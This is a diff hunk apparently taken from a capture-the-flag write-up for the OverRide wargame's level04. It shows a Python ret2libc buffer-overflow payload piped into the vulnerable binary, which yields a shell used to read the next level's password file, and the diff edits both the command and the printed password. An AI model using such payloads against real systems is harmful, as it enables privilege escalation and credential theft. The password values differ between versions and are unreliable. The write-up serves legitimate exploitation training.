@@ -98,10 +98,10 @@ exit(): 0xf7e5eb70 → \x70\xeb\xe5\xf7 (little-endian) - used as fake return
 ```bash
 level04@OverRide:~$ python -c 'print "B"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' > /tmp/payload
 
-level04@OverRide:~$ cat /tmp/payload - | ./level04
+level04@OverRide:~$ (cat /tmp/payload; cat) | ./level04
 Give me some shellcode, k
 whoami
 level05
 cat /home/users/level05/.pass
-3v8QLcN5SAhPaZZfEasfmXdwyR59ytDEMAwpvN9
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
 ```
